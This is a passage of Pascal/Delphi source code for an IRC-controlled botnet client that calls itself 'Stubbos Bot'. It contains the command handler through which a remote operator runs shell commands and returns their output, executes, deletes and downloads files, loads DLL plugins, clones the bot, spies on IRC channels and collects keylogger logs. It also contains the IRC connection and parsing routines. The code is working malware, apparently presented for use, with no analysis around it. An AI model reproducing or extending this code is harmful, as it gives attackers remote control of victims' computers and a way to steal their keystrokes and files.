                        CloneMyBot(String(IRC.Params[4]) ,
                                   String(IRC.Params[5]) ,
                                   String(IRC.Params[6]) ,
                                   String(IRC.Params[7]) ,
                                   String(IRC.Params[8]) ,
                                   StrToInt(String(IRC.Params[9])));
                  End;

              (* Admin wants us to send raw data *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_RAW) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, 5);
                    Buf := Buf + #10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (* Admin wants us to use a plugin *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_PLUGIN) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Support is deactivated.'#10;
                    {$IFDEF BOT_PLUGIN_SUPPORT}
                    If (FileExists(String(IRC.Params[4]))) Then
                    Begin
                      Buf := IRC.RecvText;
                      Delete(Buf, 1, pos(String(IRC.Params[5]), Buf)-1);

                      If DoPlugin(String(IRC.Params[4]), Buf) Then
                        Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Loaded'#10
                      Else
                        Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Failed to Load'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Plugin Failed to Load (Doesnt Exist)'#10;
                    {$ENDIF}
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* Execute Das Damn FILE mon. *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_EXECUTE) Or
                 (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_OPEN) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, 8);
                    If (FileExists(Buf)) Then
                    Begin
                      ShellExecute(0, 'open', pChar(Buf), NIL, NIL, 0);
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Executed File'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :File Doesnt Exist'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* Delete Das Damn FILE mon. *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_DELETE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, 7);
                    If (FileExists(Buf)) Then
                    Begin
                      DeleteFile(pChar(Buf));
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Deleted File'#10;
                    End Else
                      Buf := 'PRIVMSG '+IRC.FromChan+' :File Doesnt Exist'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* aww :( uninstall :/ *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_UNINSTALL) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    DoUninstall;

                    Buf := 'QUIT :Uninstalled! Stubbos Bot!'#10;
                    SendData(Buf, IsChat, tempSock);
                    Sleep(800);
                    ExitProcess(0);
                  End;

              (* Set choosen nickname *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_NICK) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'NICK '+String(IRC.Params[4])+#10;
                    SendData(Buf, False, Sock);
                  End;

              (* Join choosen channel *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_JOIN) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'JOIN '+String(IRC.Params[4])+#10;
                    SendData(Buf, False, Sock);
                  End;

              (* Part choosen channel *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_PART) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PART '+String(IRC.Params[4])+#10;
                    SendData(Buf, False, Sock);
                  End;

              (* Set mode *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_MODE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Backup := IRC.RecvText;
                    Delete(Backup, 1, Pos(' ', Backup));
                      If (Copy(Backup, 1, 1) = ' ') Then
                        Delete(Backup, 1, 1);

                    Buf := 'MODE '+Backup + #10;
                    SendData(Buf, False, Sock);
                  End;

              (* Cycle the channel *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_CYCLE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PART '+IRC.FromChan+#10'JOIN '+IRC.FromChan+' '+BOT_KEY+#10;
                    SendData(Buf, False, Sock);
                  End;

              (* Resolve a hostname *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_DNS) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Resolved ('+String(IRC.Params[4])+') to ('+ResolveIP(String(IRC.Params[4]))+')'#10;
                    SendData(Buf, False, Sock);
                  End;

              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_RUNSCRIPT) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Delete(Buf, 1, Length(BOT_COMMAND_RUNSCRIPT)+Length(BOT_PREFIX)+1);
                    If (Pos(#13, Buf) > 0) Then Delete(Buf, Pos(#13, Buf), 1);
                    If (Pos(#10, Buf) > 0) Then Delete(Buf, Pos(#10, Buf), 1);

                    If FileExists(Buf) Then
                      RunScript(Buf)
                    Else If FileExists(GetDirectory(bot_placescript)+bot_scriptdir+'\'+Buf) Then
                      RunScript(Buf);
                  End;

              (* Visit a page *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_VISIT) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (DownloadFile(String(IRC.Params[4]), '') = 0) Then
                    Begin
                      Buf := 'PRIVMSG '+IRC.FromChan+' :Visited page.'#10;
                      SendData(Buf, False, Sock);
                    End;
                  End;

              (* Remote CMD *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_REMOTECMD) Then
                If (IRC.LoggedIn)  Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                    Begin
                      Buf := IRC.RecvText;
                      Delete(Buf, 1, Pos(' ', Buf)-1);
                      If (Copy(Buf, 1, 1) = ' ') Then
                        Delete(Buf, 1, 1);

                      If (Buf <> '') Then
                      Begin
                        Backup := RunDosInCap(Buf);
                        While Pos(#10, Backup) > 0 Do
                        Begin
                          Buf := Copy(Backup, 1, Pos(#10, Backup)-1);
                          Backup := Copy(Backup, Pos(#10, Backup)+1, Length(Backup));
                          ReplaceStr(#32, #0160, Buf);
                          Buf := 'PRIVMSG '+IRC.FromNick+' :'+Buf+#10;
                          SendData(Buf, IsChat, tempSock);
                          Sleep(800);
                        End;
                      End;
                    End;

              (* Help *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_HELP) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                    Begin
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [bot prefix: '+BOT_PREFIX+']'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [login] '+BOT_COMMAND_LOGIN+' <password>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [logout] '+BOT_COMMAND_LOGOUT+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [opme;op you] '+BOT_COMMAND_OPME+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [newnick;bot gets new random name] '+BOT_COMMAND_NEWNICK+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [die;kills the bot] '+BOT_COMMAND_DIE+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [killclone;kill all clones] '+BOT_COMMAND_KILLCLONE+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [restart;bot restarts] '+BOT_COMMAND_RESTART+' <sleep interval .sec>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [info;shows computer info] '+BOT_COMMAND_INFO+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [silence;turns silence on or off] '+BOT_COMMAND_SILENCE+' <0 or 1>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [listdir;list a directory] '+BOT_COMMAND_LISTDIR+' <dir[, attributes]>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [listproc;list processlist] '+BOT_COMMAND_LISTPRoC+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [killproc;kills a running process] '+BOT_COMMAND_KILLPROC+' <PID>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [getfile;bot trigger dcc transfer] '+BOT_COMMAND_GETFILE+' <dir+name>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [download;bot downloads a remote file] '+BOT_COMMAND_DOWNLOAD+' <from, to, execute(0/1)>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [update;bot downloads a remote file and updates] '+BOT_COMMAND_UPDATE+' <from, to>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [spyon;bot spies on #chan1 and reports to #chan2] '+BOT_COMMAND_SPYON+' <#chan1, #chan2>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [spyoff;turns spy off] '+BOT_COMMAND_SPYOFF+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [clone;clones the bot] '+BOT_COMMAND_CLONE+' <server,nick,channel,key,pass,port put * for random>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [plugin;loads a dll] '+BOT_COMMAND_PLUGIN+' <dllfile, additional data>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [raw;sends rawtext] '+BOT_COMMAND_RAW+' <raw-text>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [execute;executes a file] '+BOT_COMMAND_EXECUTE+' <filename>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [delete;deletes a file] '+BOT_COMMAND_DELETE+' <filename>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [uninstall;removes the bot from system] '+BOT_COMMAND_UNINSTALL+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [nick;bot changes to choosed nick] '+BOT_COMMAND_NICK+' <nickname>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [join;bot joins choosed channel] '+BOT_COMMAND_JOIN+' <#chan>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [part;bot parts choosed channel] '+BOT_COMMAND_PART+' <#chan>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [mode;bot sets mode] '+BOT_COMMAND_MODE+' <#chan $nick $mode>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [cycle;bot cycles the channel] '+BOT_COMMAND_CYCLE+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [dns;bot resolves a hostname] '+BOT_COMMAND_DNS+' <hostname>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [visit;bot visits a page] '+BOT_COMMAND_VISIT+' <http-address>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [open;bot executes a file] '+BOT_COMMAND_OPEN+' <filename>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [remotecmd;bot executes a shellcommand] '+BOT_COMMAND_REMOTECMD+' <command>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [getlog;bot shows paths to keylogg file] '+BOT_COMMAND_GETLOG+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [rmtspy;remote irc spy] '+BOT_COMMAND_RMTSPY+' <server #chan chankey password port>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [runscript;runs a script on remote computer] '+BOT_COMMAND_RUNSCRIPT+' <filename>'#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                      Buf := 'NOTICE '+IRC.FromNick+' :'#1'HELP [help;shows this] '+BOT_COMMAND_HELP+#10;
                      SendData(Buf, IsChat, tempSock); Sleep(800);
                    End;
            End;
        End;

        If (IRC.Params[0] = 'PING') Then
        Begin
          Buf := 'PONG '+String(IRC.Params[1]) + #10;
          Send(tempSock, Buf[1], Length(Buf), 0);
        End;
      End;
      Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
    End;
End;


Procedure tSock.DoCommando;
Var
  Buffer        :Array[0..6000] Of Char;
  Data          :String;
Begin
  ZeroMemory(@Buffer, SizeOf(Buffer));
  {$IFDEF SHOW_OUTPUT} WriteLn('Waiting for incomming data.'); {$ENDIF}
  While (IRC.ReceiveData) Do
  Begin
    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
    Recv(Sock, Buffer, SizeOf(Buffer), 0);
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    {$IFDEF SHOW_OUTPUT} WriteLn('>> ['+IntToStr(Length(Data))+']: '+Data); {$ENDIF}
    {$IFDEF SHOW_OUTPUT} WriteLn; {$ENDIF}
    IsChat := False;
    ReadCommando(Data, Buffer, Sock);

    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
  End;
End;

Procedure tSock.SendInfo;
Var
  Data: String;
Begin
  Randomize;
  If (Nick = '') Then Nick := RandIRCBot;
  Data := 'USER '+Nick+' "'+Nick+IntToStr(Random(999))+'" "'+ServerN+'" :'+nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
  Data := 'NICK '+Nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
End;


Function  tSock.Connect;
Begin
  {$IFDEF SHOW_OUTPUT} WriteLn('Trying to connect.'); {$ENDIF}
  Result := False;
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  If (Sock = INVALID_SOCKET) Then Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(server));

  If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
  Begin
    {$IFDEF SHOW_OUTPUT} WriteLn('Established a connection.'); {$ENDIF}
    Result := True;
    SendInfo;
    IRC.Sock := Sock;
    If Not (IsSpy) And Not (Clone) Then
      DefaultSock := Sock;
    DoCommando;
  End;
  {$IFDEF SHOW_OUTPUT} WriteLn('Connection lost.'); {$ENDIF}
  CloseSocket(Sock);
End;

Function  tSock.StartUp: Bool;
Begin
  Servern := Server;
  Server := ResolveIP(Server);
  {$IFDEF SHOW_OUTPUT} WriteLn(ServerN+' Resolved To '+Server); {$ENDIF}
  WSAStartUp(MakeWord(2,1), WSA);
    IRC := tIRC.Create;
    {$IFDEF BOT_LOG_IRCNAMES}
      IRC.SeenNicks := RandIRCBotN;
    {$ENDIF}
    IRC.LoggedIn := False;
    IRC.Silence := False;
    Result := Connect;
    IRC.Free;
  WSACleanUp;
End;

Function  tIRC.IsNumeric(Str : String): Bool;
Var
  I: Integer;
  N: String;
Begin
  Result := True;
  N := '0123456789';
  For I := 1 To Length(Str) Do
    If (Pos(Str[I], N) = 0) Then Result := False;
End;

Procedure tIRC.SplitParam(Data: String);
Var
  I     :Integer;
  Temp  :String;
Begin
  I     := 0;
  FillChar(Params, 9000, #0);
  While (Pos(' ', Data) > 0) or (i >= 9000) Do
  Begin
    Temp := Copy(Data, 1, Pos(' ', Data)-1);
    Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
    If (Temp <> '') Then
    Begin
      Params[I] := Temp;
      Inc(I);
    End;
  End;
  If (Data <> '') Then
  Begin
    If (Pos(#10, Data) > 0) Then Delete(Data, Pos(#10, Data), 1);
    If (Pos(#13, Data) > 0) Then Delete(Data, Pos(#13, Data), 1);
    Params[I] := Data;
  End;
End;

Procedure tIRC.ParseInfo(Data: String);
Var
  Temp          :String;
Begin
  SplitParam(Data);
  IsCommand := False;

  // Nick, Host, Chan
  Temp := Params[0];
  If (Pos('@', Temp) > 0) Then
  Begin
    FromNick := Copy(Temp, 2, Pos('!', Temp)-2);
    FromHost := Copy(Temp, Pos('!', Temp)+1, Length(Temp));
    {$IFDEF BOT_LOG_IRCNAMES}
      DoIKnowHim(FromNick);
    {$ENDIF}
  End;

  If (Params[2] <> '') Then
    If (Params[2][1] = '#') Then
      FromChan := Params[2];

  // Commands
  If (IsNumeric(Params[1])) Then
  Begin
    Commando := Params[1];
    IsCommand := True;
  End Else
    If (Params[1] = 'PRIVMSG') Then
    Begin
      RecvText := Copy(Data, Pos(Params[2], Data), Length(Data));
      RecvText := Copy(RecvText, Pos(':', RecvText)+1, Length(RecvText));
      If (Pos(#10, RecvText) > 0) Then Delete(RecvText, Pos(#10, RecvText), 1);
      If (Pos(#13, RecvText) > 0) Then Delete(RecvText, Pos(#13, RecvText), 1);
    End;
End;

Function tIRC.ReceiveData: Bool;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 240;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_Struct);
  FD_SET (Sock, FD_Struct);

  If (Select(0, @FD_Struct, NIL, NIL, @TimeOut) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := False;
    Exit;
  End;
  Result := True;
End;

end.
 